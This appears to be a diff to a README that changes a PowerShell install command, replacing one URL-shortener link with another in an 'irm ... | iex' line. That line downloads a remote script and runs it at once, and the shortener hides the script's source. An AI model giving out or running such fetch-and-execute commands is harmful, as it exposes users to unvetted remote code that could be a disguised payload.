@@ -6,7 +6,7 @@ modified by kai
 
 paste the following into powershell:
 
-```irm x.gd/scutl2 | iex```
+```irm x.gd/scutlk | iex```
 
 # usage
 
